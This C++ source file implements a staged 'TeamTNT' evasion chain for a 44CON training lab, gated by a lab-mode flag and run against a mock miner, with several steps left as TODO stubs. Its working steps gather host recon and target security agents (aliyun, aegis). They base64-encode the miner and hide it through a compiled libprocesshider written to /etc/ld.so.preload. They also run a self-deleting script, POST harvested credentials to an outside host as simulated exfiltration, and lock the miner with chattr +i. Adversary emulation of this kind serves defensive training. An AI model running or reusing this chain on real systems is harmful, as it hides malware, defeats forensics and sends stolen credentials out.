#include "evasion_steps.hpp"

#include "log.hpp"
#include "util.hpp"

#include <cstdlib>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <unistd.h>

#include <fstream>
#include <sstream>

namespace evasion {

EvasionChain::EvasionChain(Config cfg) : cfg_(std::move(cfg)) {
  if (!cfg_.lab_mode) die("Set TEAMTNT_EVASION_LAB=1 for lab mode.");
  ensure_dir(cfg_.staging_dir);
}

std::filesystem::path EvasionChain::staging(const std::string& name) const {
  return std::filesystem::path(cfg_.staging_dir) / name;
}

void EvasionChain::run_all() const {
  log("==============================================");
  log(" TeamTNT Native Evasion Chain — 44CON Lab");
  log("==============================================");
  step01_host_recon();
  step02_discover_agents();
  step03_masquerade_miner();
  step04_ld_preload_hide();
  step05_anti_forensics();
  step06_chattr_immutable();
  log("==============================================");
  log(" Evasion chain complete.");
  log("==============================================");
}

void EvasionChain::step01_host_recon() const {
  log(">>> Step 01 — host recon (T1082 / T1016)");
  std::ostringstream out;
  // TODO: get hostname

  // TODO: get kernel information

  out << "=== os-release ===\n" << read_file("/etc/os-release") << '\n';
  out << "=== ip ===\n" << run_capture("ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null") << '\n';
  out << "=== mounts ===\n" << read_file("/proc/mounts").substr(0, 4000) << '\n';

  write_file(staging("host-recon.txt"), out.str());
  log("Host recon written to " + staging("host-recon.txt").string());
}

void EvasionChain::step02_discover_agents() const {
  log(">>> Step 02 — discover security agents (T1518 / T1685)");
  std::ostringstream out;
  // TODO: read from /proc/<PID>/cmdline, and check for known agents:

  // TODO: enumerate systemd service units
  if (out.str().empty()) out << "(no matching agents in lab — expected)\n";
  write_file(staging("security-agents.txt"), out.str());

  write_file(staging("disable-agents.sh"),
             "#!/bin/bash\nfor svc in aliyun.service aegis.service bmc-agent.service; do\n"
             "  systemctl is-active \"$svc\" 2>/dev/null && echo \"would disable: $svc\"\n"
             "done\n");
  chmod(staging("disable-agents.sh").c_str(), 0755);
  log("Agent discovery complete.");
}

void EvasionChain::step03_masquerade_miner() const {
  log(">>> Step 03 — masquerade miner (T1036 / T1027 / T1140)");
  const std::string miner_script =
      "#!/bin/sh\nwhile true; do dd if=/dev/zero of=/dev/null bs=1M count=1 2>/dev/null; sleep 2; "
      "done\n";
  write_file(cfg_.mock_miner_path, miner_script);
  chmod(cfg_.mock_miner_path.c_str(), 0755);

  const std::string encoded = base64_encode(miner_script);
  write_file(staging("payload.b64"), encoded);
  write_file(staging("decoded-miner.sh"), base64_decode(encoded));
  chmod(staging("decoded-miner.sh").c_str(), 0755);

  const std::string cmd = "nohup " + cfg_.mock_miner_path + " >/dev/null 2>&1 & echo $!";
  const std::string pid = run_capture(cmd);
  write_file(staging("miner.pid"), pid);
  log("Mock miner running as '" + cfg_.mock_miner_path + "'");
}

void EvasionChain::step04_ld_preload_hide() const {
  log(">>> Step 04 — ld.so.preload hide (T1574.006)");
  const auto so_path = staging("libprocesshider.so");
  const std::string compile_cmd = "gcc -shared -fPIC -o " + so_path.string() + " " +
                                  cfg_.preload_source + " -ldl 2>&1";
  const std::string build_out = run_capture(compile_cmd);
  if (!std::filesystem::exists(so_path)) {
    warn("gcc build failed — " + build_out);
    warn("Ensure PRELOAD_SOURCE points to ../lib/libprocesshider-demo.c");
    return;
  }
  log("Built " + so_path.string());

  if (is_root()) {
    write_file("/etc/ld.so.preload", so_path.string() + "\n");
    setenv("HIDE_PROCESS_NAME", cfg_.mock_miner_name.c_str(), 1);
    log("ld.so.preload configured");
  } else {
    log("Dry-run: would write '" + so_path.string() + "' to /etc/ld.so.preload");
    run_command("HIDE_PROCESS_NAME=" + cfg_.mock_miner_name + " LD_PRELOAD=" + so_path.string() +
                " ps aux | head -5");
  }
}

void EvasionChain::step05_anti_forensics() const {
  log(">>> Step 05 — anti-forensics (T1070)");
  // TODO: trim command history

  // TODO: trim log files

  const auto self_delete = staging("run-once.sh");
  write_file(self_delete, "#!/bin/bash\necho payload executed\nrm -f \"$0\"\n");
  chmod(self_delete.c_str(), 0755);
  run_command("bash " + self_delete.string());
  if (!std::filesystem::exists(self_delete)) log("Self-delete confirmed");

  const auto creds = std::filesystem::path(cfg_.attack_staging) / "harvested-creds.txt";
  if (std::filesystem::exists(creds)) {
    write_file(staging("exfil-package.txt"), read_file(creds));
    log("Staged creds for exfil demo");
    // libcurl exfil simulation (T1048) — POST to example endpoint
    const auto resp = http_.post("https://httpbin.org/post", read_file(creds),
                                 {{"Content-Type", "text/plain"}});
    if (resp.ok()) {
      log("Exfil simulation POST succeeded (httpbin.org)");
      write_file(staging("exfil-response.json"), resp.body.substr(0, 500));
    } else {
      log("Exfil simulation skipped (offline): would POST to C2");
    }
  }
}

void EvasionChain::step06_chattr_immutable() const {
  log(">>> Step 06 — chattr immutable (T1222.002)");
  if (!std::filesystem::exists(cfg_.mock_miner_path)) {
    die("Miner not found at " + cfg_.mock_miner_path + " — run step 03 first");
  }
  if (is_root() && run_command("command -v chattr >/dev/null") == 0) {
    run_command("chattr +i " + cfg_.mock_miner_path);
    log("Applied chattr +i to " + cfg_.mock_miner_path);
    write_file(staging("lsattr.txt"), run_capture("lsattr " + cfg_.mock_miner_path));
  } else {
    log("Dry-run: would run chattr +i " + cfg_.mock_miner_path);
  }
}

}  // namespace evasion
